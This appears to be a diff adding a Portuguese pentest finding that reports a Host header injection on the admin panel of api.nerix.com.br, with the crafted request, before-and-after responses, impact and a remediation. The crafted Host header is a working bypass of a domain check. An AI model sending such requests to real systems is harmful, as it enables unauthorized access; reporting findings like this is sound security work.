@@ -1,0 +1,22 @@
+# F-001: Host Header Injection no Painel Administrativo
+Severidade: Crítico
+Host: api.nerix.com.br
+URL: https://api.nerix.com.br/api/admin
+Método: GET
+Parâmetro vulnerável: Host header
+Payload: Host: admin.nerix.com.br
+Request:
+GET /api/admin HTTP/1.1
+Host: admin.nerix.com.br
+
+Response (sem Host injection):
+{"error":"Acesso negado","message":"O painel administrativo só pode ser acessado via domínio autorizado"}
+HTTP 403
+
+Response (com Host: admin.nerix.com.br):
+{"error":"Token não fornecido"}
+HTTP 401
+
+Impacto: O Host header injection permite contornar a restrição de domínio do painel administrativo. O atacante consegue atingir todos os endpoints /api/admin/* que antes eram bloqueados por domain check. Embora ainda exija token JWT, a primeira barreira de segurança foi removida.
+
+Recomendação: Validar o domínio através de um mecanismo mais seguro, como verificação do TLS/SNI ou configuração no Cloudflare, em vez de confiar no header Host que pode ser manipulado pelo cliente.
